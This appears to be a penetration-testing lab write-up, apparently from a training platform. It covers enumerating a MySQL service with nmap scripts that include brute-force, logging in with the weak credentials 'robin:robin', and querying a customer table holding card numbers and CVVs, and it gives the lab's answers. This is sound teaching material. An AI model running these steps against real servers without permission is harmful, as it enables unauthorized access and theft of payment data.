## Objective

Enumerate the MySQL service, identify its version, and extract customer data using weak credentials.

---

## Phase 1: Service Enumeration with Nmap

**Goal:** Identify the MySQL version and gather service information.

```bash
sudo nmap 10.129.15.250 -sV -sC -p3306 --script="mysql*"
```

**Why:** `-p3306` targets the default MySQL port. `--script="mysql*"` runs all MySQL-related NSE scripts, which attempt version detection, capability enumeration, and even brute-force login attempts. Note: the wildcard must be **quoted** in zsh to prevent shell glob expansion.

**Result:**

```
3306/tcp open  mysql   MySQL 8.0.27-0ubuntu0.20.04.1
Auth Plugin: caching_sha2_password
Brute-force: No valid accounts found (28260 guesses)
```

**Answer:** `MySQL 8.0.27`

Notable findings from the scan:

- `caching_sha2_password` — modern auth plugin, more secure than older `mysql_native_password`
- Brute-force failed — wordlist-based attack didn't work, but weak credentials found via other means

---

## Phase 2: Login with Weak Credentials

**Goal:** Access the MySQL server using credentials discovered during the pentest (`robin:robin`).

```bash
mysql -u robin -probin -h 10.129.15.250
```

**Why:** `-u` specifies the username, `-p` followed immediately by the password (no space) passes it inline. `-h` specifies the remote host. The warning about plaintext passwords on the CLI is expected — avoid this in real engagements by using a config file or prompting for the password interactively with `-p` alone.

**Result:** Successful login to MySQL 8.0.27.

## Phase 3: Database Enumeration

**Goal:** Identify available databases and find relevant tables.

```sql
show databases;
```

**Result:**

```
customers
information_schema
mysql
performance_schema
sys
```

`customers` is the high-value target — the others are system databases.

```sql
use customers;
show tables;
```

**Result:** Single table `myTable`.

```sql
show columns from myTable;
```

**Result:** Table contains sensitive fields including `name`, `email`, `country`, `address`, `pan` (card number), and `cvv` — this is a critical finding in a real engagement.

## Phase 4: Data Extraction

**Goal:** Find the email address of customer "Otto Lang".

```sql
select * from myTable where name = "Otto Lang";
```

**Result:**

```
Otto Lang | ultrices@google.htb | France | Belfast | 4708 Auctor Rd. | PAN: 5322224628183391 | CVV: 595
```

**Answer:** `ultrices@google.htb`

## Lessons Learned

1. **Quote wildcards in zsh** — `--script=mysql*` fails; `--script="mysql*"` works. A small syntax detail that wastes time if missed.
2. **Nmap MySQL scripts do a lot automatically** — version detection, capability flags, brute-force, and enum in one scan.
3. **Weak credentials reused across services are critical** — `robin:robin` found via SMTP enumeration worked on MySQL too, demonstrating credential reuse across protocols.
4. **Always enumerate all databases** — system databases (`information_schema`, `mysql`) are rarely useful; focus on custom ones like `customers`.
5. **Sensitive data exposure is a critical finding** — a table containing PAN numbers and CVVs in a MySQL database accessible with weak credentials is a maximum-severity finding in a real pentest.
6. **`show columns`** before querying — understanding the schema first lets you write precise queries instead of dumping everything blindly.

## Command Reference

|Command|Purpose|
|---|---|
|`nmap -p3306 --script="mysql*" <IP>`|Enumerate MySQL service, version, and attempt brute-force|
|`mysql -u <user> -p<pass> -h <IP>`|Connect to remote MySQL server|
|`show databases;`|List all databases|
|`use <database>;`|Select a database|
|`show tables;`|List tables in current database|
|`show columns from <table>;`|Show table schema|
|`select * from <table> where <condition>;`|Query specific records|
